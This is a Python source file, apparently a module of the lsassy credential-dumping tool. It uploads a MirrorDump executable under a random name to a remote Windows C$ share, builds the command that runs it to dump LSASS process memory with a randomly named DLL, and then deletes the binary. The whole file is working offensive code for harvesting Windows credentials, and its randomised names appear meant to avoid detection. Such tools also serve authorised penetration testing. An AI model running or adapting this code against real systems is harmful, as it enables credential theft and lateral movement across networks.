import logging
import os
import time
import base64
import zlib
import random
import string

from lsassy.impacketfile import ImpacketFile

from lsassy.dumpmethod import IDumpMethod


class DumpMethod(IDumpMethod):
    def __init__(self, session, timeout):
        super().__init__(session, timeout)
        self.mirrordump_remote_share = "C$"
        self.mirrordump_remote_path = "\\Windows\\Temp\\"
        self.mirrordump = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".exe"
        self.mirrordump_uploaded = False

    def prepare(self, options):
        self.mirrordump_remote_share = options.get("mirrordump_remote_share", self.mirrordump_remote_share)
        self.mirrordump_remote_path = options.get("mirrordump_remote_path", self.mirrordump_remote_path)
        self.mirrordump = options.get("mirrordump", self.mirrordump)

        # Upload MirrorDump
        logging.debug('Uploading MirrorDump...')

        if ImpacketFile.create_file(self._session, self.mirrordump_remote_share, self.mirrordump_remote_path, self.mirrordump, self.mirrordump_content) != True:
            logging.error("MirrorDump upload error", exc_info=True)
            return None
        logging.success("MirrorDump successfully uploaded")
        self.mirrordump_uploaded = True
        return True

    def clean(self):
        if self.mirrordump_uploaded:
            ImpacketFile.delete(self._session, self.mirrordump_remote_path + self.mirrordump, timeout=self._timeout)

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """{}{} -f {}{} -d {}""".format(
            self.mirrordump_remote_path, self.mirrordump,
            self.dump_path, self.dump_name,
            ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".dll"
        )
        pwsh_command = cmd_command
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }